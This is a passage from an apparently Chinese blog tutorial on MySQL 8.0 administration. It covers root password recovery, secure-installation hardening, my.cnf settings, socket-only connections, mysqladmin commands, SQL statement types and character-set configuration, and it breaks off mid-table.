title="MySQL8.0修改密码"></a>MySQL8.0修改密码</h2><p>1.如果忘记密码，使用root登录，进入/etc/my.cnf的mysqld修改</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">echo &quot;skip-grant-tables&quot; <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>systemctl restart mysqld<br></code></pre></td></tr></table></figure><p>2.进入到服务器，修改密码，本地登录用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">-</span>uroot<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>flush privileges;<br><br><span class="hljs-keyword">select</span> version();<br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+</span><br><span class="hljs-operator">|</span> version() <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">8.0</span><span class="hljs-number">.30</span>    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>3.成功登录</p><p>4.注释掉skip-grant-tables，恢复本地localhost访问</p><h2 id="mysql-secure-installation：系统自带安全加固脚本"><a href="#mysql-secure-installation：系统自带安全加固脚本" class="headerlink" title="mysql_secure_installation：系统自带安全加固脚本"></a>mysql_secure_installation：系统自带安全加固脚本</h2><p>生产环境中建议执行的脚本</p><p>在mysql5.5中会存在匿名用户，anoymous用户，脚本中可以remove掉；删除掉test的数据库</p><p>匿名账号：可以直接登陆到MySQL内，只有test库的操作权限，不能让所有人都有权限登录</p><p>作用：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">设置root密码<br>禁止root远程登录(也可以允许)，allow root login on remotely<br>删除匿名用户<br>删除test数据库<br></code></pre></td></tr></table></figure><p>在老版本(5.5 5.6 5.7左右)，需要执行一下安全脚本，在8.0以上得到安全加固了，比较稳定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##查看user和host(用户和主机)，从Mysql库的User表内查询</span><br>mysql&gt; select user,host from mysql.user;<br>+------------------+-----------+<br>| user             | host      |<br>+------------------+-----------+<br>| root             | %         |<br>| mysql.infoschema | localhost |<br>| mysql.session    | localhost |<br>| mysql.sys        | localhost |<br>| root             | localhost |<br>+------------------+-----------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment">##查看mysql的版本</span><br>mysql&gt; select version();<br><br><span class="hljs-comment">##查看现有的库</span><br>mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| sys                |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br></code></pre></td></tr></table></figure><h2 id="mysql-prompt：修改MySQL的命令行-bashrc显示"><a href="#mysql-prompt：修改MySQL的命令行-bashrc显示" class="headerlink" title="mysql-prompt：修改MySQL的命令行.bashrc显示"></a>mysql-prompt：修改MySQL的命令行.bashrc显示</h2><p>可以将mysql-prompt的变量写入到系统的变量中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim .bashrc<br><span class="hljs-built_in">export</span> MYSQL_PS1=<span class="hljs-string">&quot;(\\u@\\h) [\\d]\\_&quot;</span><br>\\u：代表当前登录MySQL的用户<br>\\h：当前登录的主机host，现在为<span class="hljs-built_in">local</span>后使用<br>[\\d]：表示default database，用户自行选择的库<br><br><br>显示效果：<br>(root@localhost) [(none)]&gt;use mysql<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>(root@localhost) [mysql]&gt;<br></code></pre></td></tr></table></figure><h1 id="MySQL服务端配置文件：my-cnf"><a href="#MySQL服务端配置文件：my-cnf" class="headerlink" title="MySQL服务端配置文件：my.cnf"></a>MySQL服务端配置文件：my.cnf</h1><p>cat /etc/my.cnf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">datadir=/var/lib/mysql<br>socket=/var/lib/mysql/mysql.sock<br><br>log-error=/var/log/mysqld.log<br>pid-file=/var/run/mysqld/mysqld.pid<br></code></pre></td></tr></table></figure><p>主要的选项，一般都是写在mysqld服务端的命令指令</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">[mysqld] 服务端<br>[mysql]客户端<br></code></pre></td></tr></table></figure><h2 id="通过禁用远程连接，实现本地socket连接"><a href="#通过禁用远程连接，实现本地socket连接" class="headerlink" title="通过禁用远程连接，实现本地socket连接"></a>通过禁用远程连接，实现本地socket连接</h2><p>一般用于数据库维护的阶段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##先查看mysql的业务端口</span><br>ss -ntl | grep 3306<br>LISTEN     0      128       [::]:3306                  [::]:*                  <br>LISTEN     0      70        [::]:33060                 [::]:*                  <br><br><span class="hljs-comment">##写配置</span><br>vim /etc/my.cnf<br>[mysqld] ---&gt;服务端指令<br>skip-networking=on<br>systemctl restart mysqld---&gt;重启服务<br><br>一般来讲，vim /etc/my.cnf还是选择<span class="hljs-comment">#注释掉好一些，也可以用on/off 1/0 true/false来代替</span><br><br><span class="hljs-comment">##再次查看端口，发现是没有端口了，但是通过本地的socket套接字还是可以连接的</span><br>[root@master ~]<span class="hljs-comment">#ss -ntl | grep 3306</span><br>[root@master ~]<span class="hljs-comment">#mysql -uroot -p123</span><br>mysql: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>---&gt;证明是socket连接的<br>(root@localhost) [(none)]&gt;status<br>UNIX socket:/var/lib/mysql/mysql.sock<br><br><span class="hljs-comment">##禁用看下status，看下MySQL的连接状态</span><br>发现这里是不能连接的证明起作用了，因为端口已经down了<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181324387-1324750877.png" alt="image-20220810214947555"></p><h1 id="mysql脚本文件：直接写SQL语句"><a href="#mysql脚本文件：直接写SQL语句" class="headerlink" title="mysql脚本文件：直接写SQL语句"></a>mysql脚本文件：直接写SQL语句</h1><p>vim test.sql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">use mysql<br>select version()<br>select user,host from user;<br></code></pre></td></tr></table></figure><p>mysql test.sql：执行该脚本</p><p>MySQL系统库：mysql库</p><h1 id="MySQL默认的存储数据的目录：-var-lib-mysql"><a href="#MySQL默认的存储数据的目录：-var-lib-mysql" class="headerlink" title="MySQL默认的存储数据的目录：/var/lib/mysql"></a>MySQL默认的存储数据的目录：/var/lib/mysql</h1><p>其实MySQL在Linux内就是一个个文件夹，一个库就是一个目录，比如说mysql库就是一个目录</p><p><img src="2792175-20220828181324708-1218696433.png" alt="image-20220810210813191"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##创建一个库，test1</span><br>(root@localhost) [(none)]&gt;create database test1 charset utf8;<br>Query OK, 1 row affected, 1 warning (0.00 sec)<br><br><span class="hljs-comment">##删除一个库，删除了磁盘上对应的目录</span><br>drop database test1<br></code></pre></td></tr></table></figure><p>有test了</p><p><img src="2792175-20220828181325114-1469597751.png" alt="image-20220810211525341"></p><h1 id="MySQL常见的客户端命令"><a href="#MySQL常见的客户端命令" class="headerlink" title="MySQL常见的客户端命令"></a>MySQL常见的客户端命令</h1><p><img src="2792175-20220828181325436-1950016114.png" alt="image-20220810212350199"></p><h2 id="1-mysqladmin"><a href="#1-mysqladmin" class="headerlink" title="1.mysqladmin"></a>1.mysqladmin</h2><p>-uroot -p123：这个需要知道MySQL的密码，没有的话不起作用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##1.查看MySQL的性能指标，线程数，处理的任务数，慢查询等等一些性能指标</span><br>mysqladmin -uroot -p123 status<br>mysqladmin: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>Uptime: 2198  Threads: 3  Questions: 52  Slow queries: 0  Opens: 180  Flush tables: 3  Open tables: 99  Queries per second avg: 0.023<br><br><span class="hljs-comment">##2.计划任务实现MySQL故障重启</span><br>mysqladmin -uroot -p123 ping <br>mysqladmin: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>mysqld is alive<br><br><span class="hljs-comment">##如果返回的$?为1，不正常，则重启MySQL(不常用)</span><br>mysql -uroot -p123 ping || systemctl restart mysqld<br></code></pre></td></tr></table></figure><p>2.查看表的状态</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">table</span> status <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;emp&#x27;</span>;<br></code></pre></td></tr></table></figure><h1 id="SQL语言规范"><a href="#SQL语言规范" class="headerlink" title="SQL语言规范"></a>SQL语言规范</h1><p>sql脚本：test.sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> mysql.user;<br><span class="hljs-keyword">SELECT</span>，<span class="hljs-keyword">FROM</span>都为关键字，mysql.user是库.表名，关键字可以大写<br><span class="hljs-comment">/*多行注释*/</span><br><br>##多个子句<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> #子句<br><span class="hljs-keyword">FROM</span> mysql.user #子句<br><span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;root&#x27;</span> #子句<br></code></pre></td></tr></table></figure><p>声明式语言</p><p>基本分类：</p><p>1.DDL语句：数据定义，包括CREATE创建，DROP删除，ALTER替换</p><p>2.DML语句：数据操作，INSERT插入，DELETE删除，UPDATE更新，增删改</p><p>3.DQL语句：查询，SELECT</p><p>4.DCL语句：数据控制语言，GRANT授权，REVOKE收回权限</p><p>5.TCL语句：事务控制语言，COMMIT提交事务，ROLLBACK回滚，SAVEPOINT存储点吧</p><p>查看SQL语句帮助</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查看<span class="hljs-keyword">SQL</span>帮助<br>mysql<span class="hljs-operator">&gt;</span> help <span class="hljs-keyword">select</span><br>(root<span class="hljs-variable">@localhost</span>) [mysql]<span class="hljs-operator">&gt;</span>help <span class="hljs-keyword">select</span><br>Name: <span class="hljs-string">&#x27;SELECT&#x27;</span><br>Description:<br>Syntax:<br><span class="hljs-keyword">SELECT</span><br>    [<span class="hljs-keyword">ALL</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">DISTINCT</span> <span class="hljs-operator">|</span> DISTINCTROW ]<br>    [HIGH_PRIORITY]<br>    [STRAIGHT_JOIN]<br>    [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]<br>    [SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]<br>    select_expr [, select_expr] ...<br>    [into_option]<br></code></pre></td></tr></table></figure><p>做修改前，或者是做重大变更，记得做一个快照</p><h2 id="1-字符集配置"><a href="#1-字符集配置" class="headerlink" title="1.字符集配置"></a>1.字符集配置</h2><p>字符集的影响：在于你是否能够插入中文的记录到表内，表内的字段是否支持中文</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs sql">在MySQL8<span class="hljs-number">.0</span>默认版本：utf8mb4<br>全世界通用字符：uft8<br>简体中文：gb2312<br><br>##MySQL8<span class="hljs-number">.0</span>都是用的utf8mb4，默认是用的<br>[mysql]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%character%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+----------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> Variable_name            <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                                                          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+----------------------------------------------------------------+</span><br><span class="hljs-operator">|</span> character_set_client     <span class="hljs-operator">|</span> utf8mb4                                                        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_connection <span class="hljs-operator">|</span> utf8mb4                                                        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_database   <span class="hljs-operator">|</span> utf8mb4                                                        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_filesystem <span class="hljs-operator">|</span> <span class="hljs-type">binary</span>                                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_results    <span class="hljs-operator">|</span> utf8mb4                                                        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_server     <span class="hljs-operator">|</span> utf8mb4                                                        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_system     <span class="hljs-operator">|</span> utf8mb3                                                        <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_sets_dir       <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span><span class="hljs-keyword">local</span><span class="hljs-operator">/</span>mysql<span class="hljs-number">-8.0</span><span class="hljs-number">.30</span><span class="hljs-operator">-</span>linux<span class="hljs-operator">-</span>glibc2<span class="hljs-number">.12</span><span class="hljs-operator">-</span>x86_64<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>charsets<span class="hljs-operator">/</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+----------------------------------------------------------------+</span><br><br>##MySQL <span class="hljs-number">5.6</span>服务端<span class="hljs-operator">/</span>客户端都是使用的不标准的字符集，服务端还是latin拉丁字符集<br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%char%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+----------------------------+</span><br><span class="hljs-operator">|</span> Variable_name            <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+----------------------------+</span><br><span class="hljs-operator">|</span> character_set_client     <span class="hljs-operator">|</span> utf8                       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_connection <span class="hljs-operator">|</span> utf8                       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_database   <span class="hljs-operator">|</span> latin1                     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_filesystem <span class="hljs-operator">|</span> <span class="hljs-type">binary</span>                     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_results    <span class="hljs-operator">|</span> utf8                       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_server     <span class="hljs-operator">|</span> latin1                     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_set_system     <span class="hljs-operator">|</span> utf8                       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> character_sets_dir       <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>charsets<span class="hljs-operator">/</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------+----------------------------+</span><br><span class="hljs-number">8</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>Linux系统内输出字符集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">[root@rocky ~]#echo $LANG<br>zh_CN.UTF-8<br></code></pre></td></tr></table></figure><p>查看MySQL数据库可用字符集，常用的几个</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> <span class="hljs-type">character</span> <span class="hljs-keyword">set</span>;<br>(root<span class="hljs-variable">@localhost</span>) [mysql]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> <span class="hljs-type">character</span> <span class="hljs-keyword">set</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+---------------------------------+---------------------+--------+</span><br><span class="hljs-operator">|</span> Charset  <span class="hljs-operator">|</span> Description                     <span class="hljs-operator">|</span> <span class="hljs-keyword">Default</span> <span class="hljs-keyword">collation</span>   <span class="hljs-operator">|</span> Maxlen <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+---------------------------------+---------------------+--------+</span><br><span class="hljs-operator">|</span> armscii8 <span class="hljs-operator">|</span> ARMSCII<span class="hljs-number">-8</span> Armenian              <span class="hljs-operator">|</span> armscii8_general_ci <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> ascii    <span class="hljs-operator">|</span> US ASCII                        <span class="hljs-operator">|</span> ascii_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> big5     <span class="hljs-operator">|</span> Big5 Traditional Chinese        <span class="hljs-operator">|</span> big5_chinese_ci     <span class="hljs-operator">|</span>      <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-type">binary</span>   <span class="hljs-operator">|</span> <span class="hljs-type">Binary</span> pseudo charset           <span class="hljs-operator">|</span> <span class="hljs-type">binary</span>              <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp1250   <span class="hljs-operator">|</span> Windows Central European        <span class="hljs-operator">|</span> cp1250_general_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp1251   <span class="hljs-operator">|</span> Windows Cyrillic                <span class="hljs-operator">|</span> cp1251_general_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp1256   <span class="hljs-operator">|</span> Windows Arabic                  <span class="hljs-operator">|</span> cp1256_general_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp1257   <span class="hljs-operator">|</span> Windows Baltic                  <span class="hljs-operator">|</span> cp1257_general_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp850    <span class="hljs-operator">|</span> DOS West European               <span class="hljs-operator">|</span> cp850_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp852    <span class="hljs-operator">|</span> DOS Central European            <span class="hljs-operator">|</span> cp852_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp866    <span class="hljs-operator">|</span> DOS Russian                     <span class="hljs-operator">|</span> cp866_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> cp932    <span class="hljs-operator">|</span> SJIS <span class="hljs-keyword">for</span> Windows Japanese       <span class="hljs-operator">|</span> cp932_japanese_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> dec8     <span class="hljs-operator">|</span> <span class="hljs-type">DEC</span> West European               <span class="hljs-operator">|</span> dec8_swedish_ci     <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> eucjpms  <span class="hljs-operator">|</span> UJIS <span class="hljs-keyword">for</span> Windows Japanese       <span class="hljs-operator">|</span> eucjpms_japanese_ci <span class="hljs-operator">|</span>      <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> euckr    <span class="hljs-operator">|</span> EUC<span class="hljs-operator">-</span>KR Korean                   <span class="hljs-operator">|</span> euckr_korean_ci     <span class="hljs-operator">|</span>      <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> gb18030  <span class="hljs-operator">|</span> China <span class="hljs-type">National</span> Standard GB18030 <span class="hljs-operator">|</span> gb18030_chinese_ci  <span class="hljs-operator">|</span>      <span class="hljs-number">4</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> gb2312   <span class="hljs-operator">|</span> GB2312 Simplified Chinese       <span class="hljs-operator">|</span> gb2312_chinese_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> gbk      <span class="hljs-operator">|</span> GBK Simplified Chinese          <span class="hljs-operator">|</span> gbk_chinese_ci      <span class="hljs-operator">|</span>      <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> geostd8  <span class="hljs-operator">|</span> GEOSTD8 Georgian                <span class="hljs-operator">|</span> geostd8_general_ci  <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> greek    <span class="hljs-operator">|</span> ISO <span class="hljs-number">8859</span><span class="hljs-number">-7</span> Greek                <span class="hljs-operator">|</span> greek_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> hebrew   <span class="hljs-operator">|</span> ISO <span class="hljs-number">8859</span><span class="hljs-number">-8</span> Hebrew               <span class="hljs-operator">|</span> hebrew_general_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> hp8      <span class="hljs-operator">|</span> HP West European                <span class="hljs-operator">|</span> hp8_english_ci      <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> keybcs2  <span class="hljs-operator">|</span> DOS Kamenicky Czech<span class="hljs-operator">-</span>Slovak      <span class="hljs-operator">|</span> keybcs2_general_ci  <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> koi8r    <span class="hljs-operator">|</span> KOI8<span class="hljs-operator">-</span>R Relcom Russian           <span class="hljs-operator">|</span> koi8r_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> koi8u    <span class="hljs-operator">|</span> KOI8<span class="hljs-operator">-</span>U Ukrainian                <span class="hljs-operator">|</span> koi8u_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> latin1   <span class="hljs-operator">|</span> cp1252 West European            <span class="hljs-operator">|</span> latin1_swedish_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> latin2   <span class="hljs-operator">|</span> ISO <span class="hljs-number">8859</span><span class="hljs-number">-2</span> Central European     <span class="hljs-operator">|</span> latin2_general_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> latin5   <span class="hljs-operator">|</span> ISO <span class="hljs-number">8859</span><span class="hljs-number">-9</span> Turkish              <span class="hljs-operator">|</span> latin5_turkish_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> latin7   <span class="hljs-operator">|</span> ISO <span class="hljs-number">8859</span><span class="hljs-number">-13</span> Baltic              <span class="hljs-operator">|</span> latin7_general_ci   <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> 